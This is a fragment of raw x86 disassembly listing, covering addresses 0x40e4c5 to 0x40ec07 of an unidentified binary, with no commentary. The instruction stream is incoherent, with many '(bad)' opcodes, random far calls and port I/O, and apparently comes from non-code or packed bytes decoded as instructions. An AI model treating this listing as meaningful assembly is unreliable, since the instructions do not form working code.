  40e4c5:	loop   0x40e4ac
  40e4c7:	iret   
  40e4c8:	mov    ds:0x9f4bff57,al
  40e4cd:	add    eax,0xc2c2a9c6
  40e4d2:	jg     0x40e51e
  40e4d4:	(bad)  
  40e4d5:	xchg   ebx,eax
  40e4d6:	in     al,0x3e
  40e4d8:	into   
  40e4d9:	dec    eax
  40e4da:	rcr    DWORD PTR [ecx],cl
  40e4dc:	adc    BYTE PTR [edi],al
  40e4de:	call   0x85ea:0xa41e7d2e
  40e4e5:	push   ecx
  40e4e6:	or     edx,DWORD PTR [ecx]
  40e4e8:	push   ds
  40e4e9:	fsubp  st(3),st
  40e4eb:	xchg   DWORD PTR gs:[edi],ebx
  40e4ee:	xchg   ebx,eax
  40e4ef:	call   0x8da5:0xc8778bb5
  40e4f6:	xchg   ecx,eax
  40e4f7:	mov    cl,0x17
  40e4f9:	or     ebx,DWORD PTR [ebp-0x4b]
  40e4fc:	call   0x40d:0x2ad86e53
  40e503:	mov    bh,0x27
  40e505:	inc    ebx
  40e506:	aam    0x38
  40e508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e509:	or     BYTE PTR ds:0x26c2e65d,ch
  40e50f:	sar    BYTE PTR [ebp+0x73],0x64
  40e513:	mov    edx,0xa5201be5
  40e518:	gs and eax,0x66e351a9
  40e51e:	xlat   BYTE PTR ds:[ebx]
  40e51f:	dec    edx
  40e520:	push   ebp
  40e521:	jecxz  0x40e4a4
  40e523:	push   esi
  40e524:	bound  edi,QWORD PTR [esi]
  40e526:	dec    ebp
  40e527:	pop    esi
  40e528:	inc    ebp
  40e529:	fwait
  40e52a:	xlat   BYTE PTR ds:[ebx]
  40e52b:	sbb    cl,al
  40e52d:	dec    edx
  40e52e:	pop    eax
  40e52f:	ins    BYTE PTR es:[edi],dx
  40e530:	int    0x91
  40e532:	mov    ah,dl
  40e534:	int3   
  40e535:	dec    ebp
  40e536:	push   ebx
  40e537:	sbb    eax,0xbcb081be
  40e53c:	fild   WORD PTR [esi+0x5e]
  40e53f:	test   dh,0x19
  40e542:	sbb    al,0x83
  40e544:	stos   BYTE PTR es:[edi],al
  40e545:	call   0x8ed8:0x7997a894
  40e54c:	push   edx
  40e54d:	repnz loop 0x40e518
  40e550:	aaa    
  40e551:	ret    0x90ff
  40e554:	mov    esi,0xe762de6a
  40e559:	add    eax,0xc7a493f6
  40e55e:	dec    ebp
  40e55f:	fwait
  40e560:	mov    cl,BYTE PTR [eax+eax*8]
  40e563:	jle    0x40e59c
  40e565:	out    dx,eax
  40e566:	mov    dl,0x8d
  40e568:	and    eax,0x99ce3295
  40e56d:	jl     0x40e579
  40e56f:	clc    
  40e570:	inc    eax
  40e571:	or     DWORD PTR [ecx],0xe3942b3
  40e577:	test   BYTE PTR [edi-0x65],bl
  40e57a:	in     al,0x0
  40e57c:	retf   
  40e57d:	cdq    
  40e57e:	dec    esp
  40e57f:	aam    0x96
  40e581:	loop   0x40e5a5
  40e583:	xchg   ebx,eax
  40e584:	push   ss
  40e585:	test   esi,ebp
  40e587:	jmp    0x40e50d
  40e589:	or     BYTE PTR ds:0xf50b0fe5,0x8b
  40e590:	dec    eax
  40e591:	pusha  
  40e592:	add    al,0x92
  40e594:	mov    eax,0x1c0d0e87
  40e599:	(bad)  
  40e59a:	loop   0x40e5ce
  40e59c:	(bad)  
  40e59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e59e:	sub    ecx,edi
  40e5a0:	inc    ebp
  40e5a1:	mov    esp,0xdb3253b9
  40e5a6:	xor    dl,BYTE PTR [edi]
  40e5a8:	mov    bl,BYTE PTR [eax-0x40]
  40e5ab:	dec    esp
  40e5ac:	test   al,0x36
  40e5ae:	dec    ebx
  40e5af:	in     eax,0xd3
  40e5b1:	repz fmul QWORD PTR [edi+0x19]
  40e5b5:	adc    DWORD PTR [esi+0x5583e4dd],0x4e04c2e4
  40e5bf:	in     al,0xa1
  40e5c1:	mov    esp,0xe871926a
  40e5c6:	fld    DWORD PTR [eax-0x3059fd62]
  40e5cc:	arpl   WORD PTR [edx],si
  40e5ce:	adc    eax,0xa8e9911b
  40e5d3:	mov    esp,0x3ea6afe4
  40e5d8:	adc    al,0xd4
  40e5da:	pushf  
  40e5db:	pop    ss
  40e5dc:	push   ss
  40e5dd:	jo     0x40e5d4
  40e5df:	mov    ch,0x48
  40e5e1:	in     al,dx
  40e5e2:	inc    ebp
  40e5e3:	xchg   DWORD PTR [ebp-0x7eb7b526],ebp
  40e5e9:	call   0x70f:0xf2eb9cd5
  40e5f0:	mov    WORD PTR [eax-0x6ba82368],ds
  40e5f6:	popf   
  40e5f7:	jge    0x40e5e3
  40e5f9:	in     al,0xd8
  40e5fb:	stos   BYTE PTR es:[edi],al
  40e5fc:	gs adc dl,0xfd
  40e600:	jo     0x40e62c
  40e602:	ins    BYTE PTR es:[edi],dx
  40e603:	push   esp
  40e604:	adc    eax,0x4b70dac9
  40e609:	jle    0x40e674
  40e60b:	test   DWORD PTR [edx-0x38],ebp
  40e60e:	mov    eax,ds:0xd21b76f2
  40e613:	gs pop esp
  40e615:	call   0xc9bb:0x5c161984
  40e61c:	stos   BYTE PTR es:[edi],al
  40e61d:	nop
  40e61e:	enter  0x7826,0x3c
  40e622:	mov    ds:0xc1afaadb,eax
  40e627:	nop
  40e628:	mov    al,0xdb
  40e62a:	out    0x85,al
  40e62c:	mov    edx,0xc9b264de
  40e631:	mov    ecx,0xe6835d64
  40e636:	fcom   DWORD PTR [ebx+0x22]
  40e639:	adc    edi,DWORD PTR [esi-0x708401ab]
  40e63f:	sahf   
  40e640:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e642:	fcomip st,st(1)
  40e644:	adc    BYTE PTR [edx],ch
  40e646:	je     0x40e675
  40e648:	fild   DWORD PTR [ebp-0xc]
  40e64b:	sbb    DWORD PTR [edi+0x48ea675a],0x5b9bec45
  40e655:	push   ss
  40e656:	mov    eax,0x712c8447
  40e65b:	aam    0x8a
  40e65d:	jne    0x40e618
  40e65f:	out    dx,al
  40e660:	in     eax,dx
  40e661:	call   FWORD PTR [edx+0xf]
  40e664:	mov    al,0xc3
  40e666:	or     BYTE PTR [esi-0x80],ch
  40e669:	(bad)  
  40e66a:	fidiv  DWORD PTR [ebx+0x32224641]
  40e670:	sbb    ebx,esi
  40e672:	inc    ecx
  40e673:	js     0x40e610
  40e675:	adc    ecx,DWORD PTR [di-0x4a]
  40e679:	stos   BYTE PTR es:[edi],al
  40e67a:	cmp    eax,0x59064649
  40e67f:	(bad)  
  40e680:	push   eax
  40e681:	push   ecx
  40e682:	arpl   WORD PTR [ebx],dx
  40e684:	shl    esp,0x97
  40e687:	les    ebx,FWORD PTR [eax-0x43bb87c5]
  40e68d:	retf   0x4f11
  40e690:	dec    ecx
  40e691:	jecxz  0x40e696
  40e693:	ins    BYTE PTR es:[edi],dx
  40e694:	iret   
  40e695:	dec    ecx
  40e696:	stos   BYTE PTR es:[edi],al
  40e697:	stc    
  40e698:	enter  0x7a76,0x84
  40e69c:	mov    cl,0x7
  40e69e:	int    0x6d
  40e6a0:	shl    DWORD PTR [eax+0x56],1
  40e6a3:	lods   eax,DWORD PTR ds:[esi]
  40e6a4:	mov    fs,ebp
  40e6a6:	in     eax,0xd4
  40e6a8:	call   0x5479aa21
  40e6ad:	xchg   BYTE PTR [ebx],bl
  40e6af:	push   ss
  40e6b0:	popf   
  40e6b1:	mov    eax,0xd3c86ce2
  40e6b6:	xlat   BYTE PTR es:[ebx]
  40e6b8:	sub    ebp,DWORD PTR [ecx]
  40e6ba:	repnz cdq 
  40e6bc:	mov    dl,0x4a
  40e6be:	push   cs
  40e6bf:	push   ss
  40e6c0:	shl    DWORD PTR [ecx+0x2],1
  40e6c3:	scas   al,BYTE PTR es:[edi]
  40e6c4:	std    
  40e6c5:	nop
  40e6c6:	xor    al,0x64
  40e6c8:	adc    al,0x93
  40e6ca:	test   al,0xc3
  40e6cc:	cmp    BYTE PTR ds:[eax+eax*4],dh
  40e6d0:	mov    edx,0x874fe97d
  40e6d5:	jge    0x40e6da
  40e6d7:	jae    0x40e73f
  40e6d9:	retf   
  40e6da:	mov    eax,0x6af29c00
  40e6df:	inc    esi
  40e6e0:	aam    0xcc
  40e6e2:	mov    esi,0x44e5ba2a
  40e6e7:	mov    ah,0xc8
  40e6e9:	(bad)  
  40e6ea:	add    DWORD PTR ss:[edi+0x1b],0xffffffee
  40e6ef:	push   0xcb40e534
  40e6f4:	daa    
  40e6f5:	push   esp
  40e6f6:	sub    esp,0x15
  40e6f9:	idiv   ah
  40e6fb:	adc    ch,ch
  40e6fd:	outs   dx,DWORD PTR ds:[esi]
  40e6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ff:	push   ss
  40e700:	pusha  
  40e701:	jb     0x40e701
  40e703:	xor    bl,BYTE PTR [ebx+esi*8-0x7e]
  40e707:	mov    ds,ecx
  40e709:	inc    ebp
  40e70a:	sub    BYTE PTR [ecx+0x5408e645],cl
  40e710:	or     dh,BYTE PTR [ebx]
  40e712:	aaa    
  40e713:	pop    edi
  40e714:	sub    esp,DWORD PTR [ecx]
  40e716:	pop    ebp
  40e717:	(bad)  
  40e718:	pop    edi
  40e719:	fist   WORD PTR [esp+edx*1+0x42]
  40e71d:	xchg   ebx,eax
  40e71e:	inc    ecx
  40e71f:	fadd   DWORD PTR [ebx-0x22984105]
  40e725:	into   
  40e726:	jb     0x40e6bd
  40e728:	les    edx,FWORD PTR [edi+0x5a]
  40e72b:	jg     0x40e78e
  40e72d:	mov    ecx,0x4d21363
  40e732:	or     ebp,ecx
  40e734:	daa    
  40e735:	add    eax,DWORD PTR [esi-0x3c3e2022]
  40e73b:	pop    esi
  40e73c:	and    eax,DWORD PTR [eax+ebx*1-0x67]
  40e740:	je     0x40e70d
  40e742:	int3   
  40e743:	dec    DWORD PTR [esi]
  40e745:	inc    edi
  40e746:	rcl    BYTE PTR [ebp-0x74580cd7],1
  40e74c:	mov    ah,0x6a
  40e74e:	in     al,0x9e
  40e750:	or     BYTE PTR [esi+0x1f],bh
  40e753:	xor    eax,edx
  40e755:	icebp  
  40e756:	outs   dx,BYTE PTR ds:[esi]
  40e757:	add    ah,dh
  40e759:	push   ss
  40e75a:	fcomp  DWORD PTR [edx+0x24]
  40e75d:	iret   
  40e75e:	cmp    dl,ch
  40e760:	mov    bh,0x59
  40e762:	pop    esp
  40e763:	loop   0x40e738
  40e765:	cmc    
  40e766:	mov    eax,0x87eada0f
  40e76b:	(bad)  
  40e76c:	(bad)  
  40e76d:	xchg   esp,eax
  40e76e:	mov    cl,0x67
  40e770:	out    dx,al
  40e771:	push   0x1
  40e773:	dec    esp
  40e774:	sub    ch,BYTE PTR [ecx-0x472620c5]
  40e77a:	mov    ch,0x93
  40e77c:	or     ebp,eax
  40e77e:	sahf   
  40e77f:	and    al,0xcc
  40e781:	xor    bh,bl
  40e783:	(bad)  
  40e784:	pushf  
  40e785:	pushf  
  40e786:	pop    ecx
  40e787:	push   esi
  40e788:	rcr    dl,cl
  40e78a:	les    edi,FWORD PTR [ecx-0x7]
  40e78d:	xor    eax,0x9f287010
  40e792:	cli    
  40e793:	xchg   ecx,eax
  40e794:	test   bh,dh
  40e796:	in     al,0x29
  40e798:	jmp    0xb86f9d8c
  40e79d:	adc    eax,0x4374990c
  40e7a2:	pop    es
  40e7a3:	mov    ds:0x83ed2a70,al
  40e7a8:	cld    
  40e7a9:	test   al,0x77
  40e7ab:	jno    0x40e792
  40e7ad:	xor    ebp,edi
  40e7af:	push   0xe3466118
  40e7b4:	imul   ecx,esi,0x19
  40e7b7:	and    edx,edx
  40e7b9:	cs aaa 
  40e7bb:	jmp    0x40e7f8
  40e7bd:	hlt    
  40e7be:	adc    eax,eax
  40e7c0:	cdq    
  40e7c1:	inc    esi
  40e7c2:	mov    WORD PTR [edx+ecx*2],es
  40e7c5:	push   0xffffff8e
  40e7c7:	dec    esi
  40e7c8:	inc    esp
  40e7c9:	adc    DWORD PTR [ecx-0x6d],0x49
  40e7cd:	and    eax,0xde242525
  40e7d2:	mov    eax,0x6dc27657
  40e7d7:	pop    esi
  40e7d8:	sbb    eax,ecx
  40e7da:	repz adc cl,BYTE PTR [ebx-0x4dae2818]
  40e7e1:	adc    ebx,DWORD PTR [ebx+0x4401d3ac]
  40e7e7:	addr16 ss xor al,0x51
  40e7eb:	sub    eax,ebp
  40e7ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ee:	call   0x172517cc
  40e7f3:	xor    BYTE PTR ds:0xdf40c139,0x58
  40e7fa:	jne    0x40e7cd
  40e7fc:	inc    ecx
  40e7fd:	bound  esp,QWORD PTR [ecx-0x1d]
  40e800:	rol    bl,cl
  40e802:	in     al,0x94
  40e804:	xor    al,BYTE PTR [eax]
  40e806:	inc    ebp
  40e807:	loop   0x40e7d9
  40e809:	retf   
  40e80a:	je     0x40e7e0
  40e80c:	jbe    0x40e86c
  40e80e:	popf   
  40e80f:	call   0xbb32:0xf0adb3b0
  40e816:	sbb    cl,BYTE PTR [ebp+0x39a2fc2f]
  40e81c:	cmc    
  40e81d:	sbb    BYTE PTR [ebx],dl
  40e81f:	lock in eax,dx
  40e821:	sbb    ch,cl
  40e823:	dec    eax
  40e824:	jmp    0xe62f:0xbb530d7e
  40e82b:	arpl   bx,bx
  40e82d:	dec    ebp
  40e82e:	xor    al,0x49
  40e830:	xchg   ebx,eax
  40e831:	mov    WORD PTR [ebp-0x44],es
  40e834:	jmp    0xd9193c3
  40e839:	mov    edi,0xc88a5d7d
  40e83e:	add    al,0xb9
  40e840:	inc    esp
  40e841:	push   edi
  40e842:	arpl   WORD PTR [eax],bx
  40e844:	or     BYTE PTR ds:0x162c04a3,0x8b
  40e84b:	or     al,0xd7
  40e84d:	jns    0x40e81b
  40e84f:	ret    0x9442
  40e852:	out    0x8d,al
  40e854:	retf   
  40e855:	call   0xd25874a0
  40e85a:	cs daa 
  40e85c:	or     dh,BYTE PTR [esi+esi*1]
  40e85f:	add    cl,BYTE PTR [ebp-0x4ade5372]
  40e865:	je     0x40e82b
  40e867:	jecxz  0x40e8e1
  40e869:	mov    dl,0x1b
  40e86b:	into   
  40e86c:	test   al,0x7d
  40e86e:	repnz push es
  40e870:	push   es
  40e871:	push   ecx
  40e872:	retf   0x2bc3
  40e875:	popf   
  40e876:	xchg   ebp,eax
  40e877:	lods   eax,DWORD PTR ds:[esi]
  40e878:	mov    bh,0x98
  40e87a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e87b:	cwde   
  40e87c:	push   edx
  40e87d:	and    dl,BYTE PTR [ebx-0x4c]
  40e880:	fbld   TBYTE PTR [ebx+0x20]
  40e883:	xor    ah,dl
  40e885:	ss in  al,0x83
  40e888:	nop
  40e889:	mov    edx,0x95de63be
  40e88e:	sub    al,0xdc
  40e890:	enter  0xe2ed,0xa8
  40e894:	repnz add DWORD PTR [ecx],0x9
  40e898:	xchg   ecx,eax
  40e899:	rcr    BYTE PTR [ebp-0x5c],1
  40e89c:	cld    
  40e89d:	loope  0x40e8de
  40e89f:	and    al,0x97
  40e8a1:	or     dh,BYTE PTR [edx+0x21]
  40e8a4:	mov    eax,ds:0x655b69c9
  40e8a9:	mov    edx,0x7f85c185
  40e8ae:	and    eax,0x8a9989b7
  40e8b3:	dec    ebx
  40e8b4:	in     al,dx
  40e8b5:	dec    esp
  40e8b6:	jl     0x40e875
  40e8b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8b9:	aaa    
  40e8ba:	mov    BYTE PTR [edi+0x54],bl
  40e8bd:	adc    BYTE PTR [ecx-0xacc4834],bl
  40e8c3:	and    eax,0xd8e0d1e5
  40e8c8:	and    ecx,edx
  40e8ca:	enter  0x350d,0x75
  40e8ce:	loopne 0x40e8fc
  40e8d0:	rol    BYTE PTR [ebx-0x2ec370f3],1
  40e8d6:	mov    bh,0x75
  40e8d8:	popf   
  40e8d9:	cld    
  40e8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8db:	leave  
  40e8dc:	xchg   BYTE PTR [ebp-0x51f896de],cl
  40e8e2:	es jbe 0x40e8c2
  40e8e5:	imul   ebp,DWORD PTR [eax+0x2028c67a],0x29d00978
  40e8ef:	sub    eax,0x207eb717
  40e8f4:	cmp    edi,ebx
  40e8f6:	out    dx,eax
  40e8f7:	xor    eax,0x548467d0
  40e8fc:	dec    ebp
  40e8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8fe:	idiv   DWORD PTR [ebx]
  40e900:	call   0x82e2:0xd3c4cc03
  40e907:	mov    bh,0xf8
  40e909:	jbe    0x40e93e
  40e90b:	pop    ss
  40e90c:	pop    edx
  40e90d:	ins    DWORD PTR es:[edi],dx
  40e90e:	inc    ebx
  40e90f:	and    DWORD PTR [edi-0x65982d8c],ebx
  40e915:	mov    ds,WORD PTR [ebp+0x62]
  40e918:	sbb    ch,BYTE PTR [ebx-0x25]
  40e91b:	lods   eax,DWORD PTR ds:[esi]
  40e91c:	arpl   WORD PTR [ecx+0x67eef7c],si
  40e922:	(bad)  
  40e924:	(bad)  
  40e925:	mov    DWORD PTR [eax+ebx*1],ebx
  40e928:	cmp    esi,DWORD PTR [edx+ebp*8-0x49]
  40e92c:	add    BYTE PTR [edi],dh
  40e92e:	fcom   st(6)
  40e930:	inc    eax
  40e931:	push   cs
  40e932:	int3   
  40e933:	push   ebp
  40e934:	(bad)  
  40e935:	aad    0xdc
  40e937:	sub    DWORD PTR ds:0x4d4d89af,esi
  40e93d:	ss std 
  40e93f:	and    esp,ecx
  40e941:	not    DWORD PTR [edx]
  40e943:	lahf   
  40e944:	mov    BYTE PTR [ecx+0x7416202f],ah
  40e94a:	sti    
  40e94b:	push   edi
  40e94c:	pushf  
  40e94d:	cwde   
  40e94e:	xchg   DWORD PTR [eax],esi
  40e950:	jge    0x40e911
  40e952:	xchg   edi,eax
  40e953:	daa    
  40e954:	dec    ebx
  40e955:	adc    edx,DWORD PTR [edi]
  40e957:	je     0x40e914
  40e959:	(bad)  [eax]
  40e95b:	and    edx,DWORD PTR [ecx]
  40e95d:	mov    bl,BYTE PTR [ecx]
  40e95f:	lds    eax,FWORD PTR [edi+0x41]
  40e962:	cdq    
  40e963:	shr    DWORD PTR [esi-0x6d],1
  40e966:	and    bh,BYTE PTR [ebx-0x78]
  40e969:	cwde   
  40e96a:	xchg   ecx,ecx
  40e96c:	enter  0xa402,0xfe
  40e970:	cmovnp eax,DWORD PTR [ebp+0x51620349]
  40e977:	inc    ecx
  40e978:	test   al,0x7e
  40e97a:	push   esp
  40e97b:	pop    es
  40e97c:	loopne 0x40e993
  40e97e:	enter  0xeb2a,0x4
  40e982:	fidiv  WORD PTR [esi+0x3f5ab74e]
  40e988:	pop    edi
  40e989:	dec    edx
  40e98a:	int3   
  40e98b:	iret   
  40e98c:	inc    ebp
  40e98d:	jp     0x40e96e
  40e98f:	add    edx,DWORD PTR [edi+0x30]
  40e992:	jmp    0x4daff7b7
  40e997:	mov    ebx,0xa977e1d
  40e99c:	pop    es
  40e99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e99e:	cmp    al,BYTE PTR [edi-0x2e]
  40e9a1:	xor    al,0x1f
  40e9a3:	(bad)  
  40e9a4:	pop    esi
  40e9a5:	scas   eax,DWORD PTR es:[edi]
  40e9a6:	ds inc ebx
  40e9a8:	mov    DWORD PTR [edi+0x40],edx
  40e9ab:	push   ecx
  40e9ac:	and    ebp,edi
  40e9ae:	(bad)  
  40e9b0:	mov    ds:0xb43a28e7,al
  40e9b5:	ss jb  0x40e9da
  40e9b8:	pop    ds
  40e9b9:	push   ds
  40e9ba:	dec    DWORD PTR [ebp-0x7]
  40e9bd:	adc    edi,edi
  40e9bf:	xor    BYTE PTR [ecx-0x28],al
  40e9c2:	enter  0x8475,0xa7
  40e9c6:	scas   al,BYTE PTR es:[edi]
  40e9c7:	sahf   
  40e9c8:	push   ecx
  40e9c9:	fild   QWORD PTR [ebp-0xb]
  40e9cc:	lods   al,BYTE PTR ds:[esi]
  40e9cd:	push   ebp
  40e9ce:	inc    esp
  40e9cf:	sbb    dh,BYTE PTR [esi]
  40e9d1:	dec    esp
  40e9d2:	bound  ebx,QWORD PTR [esp+ebp*4+0x4a0e4aa5]
  40e9d9:	pop    ds
  40e9da:	fnstsw WORD PTR [ebx-0x42]
  40e9dd:	push   0x8da20df2
  40e9e2:	inc    esp
  40e9e3:	mov    ebp,DWORD PTR [edx]
  40e9e5:	ja     0x40e9ce
  40e9e7:	jmp    0x40ea10
  40e9e9:	clc    
  40e9ea:	cmp    ebp,DWORD PTR [edx+eiz*2]
  40e9ed:	(bad)  
  40e9ee:	pushf  
  40e9ef:	mov    esp,0x91df291a
  40e9f4:	mov    dl,al
  40e9f6:	aas    
  40e9f7:	cmp    DWORD PTR [ebx-0x34],esp
  40e9fa:	lahf   
  40e9fb:	lods   eax,DWORD PTR cs:[esi]
  40e9fd:	into   
  40e9fe:	gs jge 0x40ea63
  40ea01:	ja     0x40ea74
  40ea03:	and    DWORD PTR [ebx-0x18d6f9d0],eax
  40ea09:	ins    BYTE PTR es:[edi],dx
  40ea0a:	mov    bh,0x6d
  40ea0c:	add    DWORD PTR [esi-0x30],esi
  40ea0f:	mov    ecx,0xc66eef4
  40ea14:	sahf   
  40ea15:	pop    edi
  40ea16:	(bad)  
  40ea19:	hlt    
  40ea1a:	mov    eax,0xed930d72
  40ea1f:	stos   DWORD PTR es:[edi],eax
  40ea20:	add    cl,BYTE PTR [esi+0x97ca0f5]
  40ea26:	aas    
  40ea27:	inc    edx
  40ea28:	aaa    
  40ea29:	aad    0x43
  40ea2b:	imul   ebp,ebx,0xffffffd1
  40ea2e:	mov    esp,0x4debeb1d
  40ea33:	sbb    ch,BYTE PTR [edi]
  40ea35:	xor    bl,BYTE PTR [edi]
  40ea37:	fwait
  40ea38:	jg     0x40ea1b
  40ea3a:	jnp    0x40e9c2
  40ea3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea3d:	sbb    eax,0xfc2cb295
  40ea42:	ror    BYTE PTR [edx*2+0x65e13f38],cl
  40ea49:	scas   eax,DWORD PTR es:[edi]
  40ea4a:	pop    edx
  40ea4b:	out    dx,al
  40ea4c:	push   eax
  40ea4d:	rol    BYTE PTR [ebp+0x6e7fae60],0x8
  40ea54:	push   eax
  40ea55:	dec    eax
  40ea56:	adc    eax,DWORD PTR cs:[ebp-0x588bde73]
  40ea5d:	daa    
  40ea5e:	cmp    al,0xd3
  40ea60:	xor    DWORD PTR [eax],eax
  40ea62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea63:	mov    edi,0x4e6707cd
  40ea68:	mov    cs,edi
  40ea6a:	imul   BYTE PTR gs:[eax]
  40ea6d:	mov    ebp,0xa84b39b1
  40ea72:	repz inc edx
  40ea74:	mov    esp,0x1bec2723
  40ea79:	fs (bad) 
  40ea7b:	rol    BYTE PTR [ecx],1
  40ea7d:	adc    eax,0xe5cece9
  40ea82:	jp     0x40eacc
  40ea84:	sar    edx,0x30
  40ea87:	or     DWORD PTR ss:[ebx-0x2],ecx
  40ea8b:	dec    esp
  40ea8c:	in     eax,0x4b
  40ea8e:	popa   
  40ea8f:	and    ch,BYTE PTR [edi-0x79]
  40ea92:	mov    esi,0x77fdf977
  40ea97:	lds    esi,FWORD PTR [ecx-0x2a]
  40ea9a:	das    
  40ea9b:	pop    es
  40ea9c:	xchg   ecx,eax
  40ea9d:	pop    ss
  40ea9e:	stc    
  40ea9f:	xchg   esi,eax
  40eaa0:	xchg   esp,eax
  40eaa1:	and    dh,dh
  40eaa3:	mov    dh,0x8c
  40eaa5:	push   es
  40eaa6:	push   ecx
  40eaa8:	pop    ss
  40eaa9:	not    DWORD PTR [eax-0xa]
  40eaac:	mov    esp,0x593e13f8
  40eab1:	mov    edi,0x5c26286c
  40eab6:	cmp    BYTE PTR [ecx-0x39],al
  40eab9:	arpl   WORD PTR [edx-0x53],di
  40eabc:	ret    
  40eabd:	cld    
  40eabe:	adc    ebp,0xffffffb1
  40eac1:	sbb    DWORD PTR [ecx],ecx
  40eac3:	jno    0x40eafa
  40eac5:	or     ah,dh
  40eac7:	mov    eax,ebp
  40eac9:	(bad)  
  40eacb:	jmp    0x40eb26
  40eacd:	add    dl,BYTE PTR ds:0xdf5f4bb7
  40ead3:	das    
  40ead4:	sub    eax,0xd11b360a
  40ead9:	jb     0x40ea8e
  40eadb:	daa    
  40eadc:	cmc    
  40eadd:	inc    eax
  40eade:	jbe    0x40eaa1
  40eae0:	les    ebx,FWORD PTR [ebx]
  40eae2:	mov    edx,0x7fa4be02
  40eae7:	xor    dh,ah
  40eae9:	add    ebp,edx
  40eaeb:	xchg   ebp,eax
  40eaec:	mov    dl,0xdd
  40eaee:	mov    bl,BYTE PTR [esi-0x43b5439c]
  40eaf4:	mov    dl,0xf3
  40eaf6:	jle    0x40eb68
  40eaf8:	pop    esp
  40eaf9:	sbb    ecx,DWORD PTR [eax+edx*4-0x5811da2e]
  40eb00:	fistp  WORD PTR ds:0x240d9f1
  40eb06:	(bad)  
  40eb07:	repz mov ds:0x48cbee89,al
  40eb0d:	dec    edi
  40eb0e:	adc    ecx,eax
  40eb10:	xchg   esp,eax
  40eb11:	es sahf 
  40eb13:	aaa    
  40eb14:	mov    al,0xa2
  40eb16:	jle    0x40eac7
  40eb18:	mov    esp,DWORD PTR [bx-0x219e]
  40eb1d:	add    eax,0x93e4a85
  40eb22:	jo     0x40eb2d
  40eb24:	jb     0x40eaba
  40eb26:	inc    esp
  40eb27:	pushf  
  40eb28:	call   0x8204:0x85502906
  40eb2f:	push   cs
  40eb30:	push   es
  40eb31:	in     eax,0x2a
  40eb33:	mov    bh,0xf6
  40eb35:	xchg   BYTE PTR es:[edx],cl
  40eb38:	test   al,0x66
  40eb3a:	sar    eax,cl
  40eb3c:	mov    cl,BYTE PTR [ecx-0x3f]
  40eb3f:	add    edi,DWORD PTR [edx+esi*1-0x8]
  40eb43:	sti    
  40eb44:	jmp    0x49778c32
  40eb49:	ret    0x7eb4
  40eb4c:	mul    BYTE PTR [edi-0x42]
  40eb4f:	mov    al,0xc4
  40eb51:	xor    esp,DWORD PTR [esi+0x1c]
  40eb54:	cmc    
  40eb55:	mov    eax,0x531c3d4e
  40eb5a:	outs   dx,BYTE PTR ds:[esi]
  40eb5b:	pop    edx
  40eb5c:	jp     0x40ebc9
  40eb5e:	pop    edi
  40eb5f:	mov    ch,0xfa
  40eb61:	aaa    
  40eb62:	mov    cl,0x1d
  40eb64:	push   edi
  40eb65:	test   BYTE PTR [edx],al
  40eb67:	lods   eax,DWORD PTR ds:[esi]
  40eb68:	push   esi
  40eb69:	dec    ebp
  40eb6a:	(bad)
  40eb6d:	scas   al,BYTE PTR es:[edi]
  40eb6e:	nop
  40eb6f:	jb     0x40ebb3
  40eb71:	daa    
  40eb72:	pop    ebx
  40eb73:	js     0x40ebb5
  40eb75:	cmp    esp,eax
  40eb77:	test   BYTE PTR [edi],ah
  40eb79:	pusha  
  40eb7a:	mov    ds:0xcfe45a4c,eax
  40eb7f:	ja     0x40eb08
  40eb81:	in     al,dx
  40eb82:	inc    edx
  40eb83:	and    eax,0x5448d473
  40eb88:	cs inc ecx
  40eb8a:	lahf   
  40eb8b:	aam    0x64
  40eb8d:	daa    
  40eb8e:	out    0x79,al
  40eb90:	push   ebp
  40eb91:	jle    0x40ebb0
  40eb93:	adc    BYTE PTR [ebx+0x20],0x28
  40eb97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb98:	mov    BYTE PTR [edi+0x12],al
  40eb9b:	mov    dl,0xba
  40eb9d:	js     0x40ebf4
  40eb9f:	cli    
  40eba0:	clc    
  40eba1:	and    al,BYTE PTR [ebx-0x1270aa56]
  40eba7:	inc    edx
  40eba8:	pop    ds
  40eba9:	mov    ds:0x3e0b0856,eax
  40ebae:	js     0x40ebbd
  40ebb0:	shl    DWORD PTR [ebp-0x1c],cl
  40ebb3:	sbb    ebx,DWORD PTR [ebx-0x17e4aa48]
  40ebb9:	sub    al,0x9
  40ebbb:	sahf   
  40ebbc:	add    ah,ah
  40ebbe:	or     esi,esi
  40ebc0:	sbb    al,0x95
  40ebc2:	mov    ds:0x61e444c6,al
  40ebc7:	out    0x82,al
  40ebc9:	pop    edi
  40ebca:	adc    eax,0xe8ec20a6
  40ebcf:	sbb    DWORD PTR [esi],esi
  40ebd1:	dec    edx
  40ebd2:	cwde   
  40ebd3:	arpl   WORD PTR [edx+edx*4],bx
  40ebd6:	stos   BYTE PTR es:[edi],al
  40ebd7:	fiadd  DWORD PTR [edi+0x2]
  40ebda:	in     eax,dx
  40ebdb:	js     0x40ebd7
  40ebdd:	cmp    DWORD PTR [ecx],ebp
  40ebdf:	mov    ds:0xae391301,al
  40ebe4:	sub    DWORD PTR [eax],esi
  40ebe6:	or     DWORD PTR [edx],ebp
  40ebe8:	xor    edx,ecx
  40ebea:	aad    0x76
  40ebec:	sbb    BYTE PTR [ebp+0x1c],dl
  40ebef:	out    0x21,al
  40ebf1:	stos   BYTE PTR es:[edi],al
  40ebf2:	mov    eax,0xbf488cf6
  40ebf7:	mov    gs,WORD PTR [edx]
  40ebf9:	inc    eax
  40ebfa:	xchg   esp,eax
  40ebfb:	and    al,BYTE PTR [ebp+0x24e8c6dc]
  40ec01:	pop    ss
  40ec02:	inc    edi
  40ec03:	jns    0x40ec72
  40ec05:	in     eax,0xa7
  40ec07:	fst    DWORD PTR ds:0x6217b569
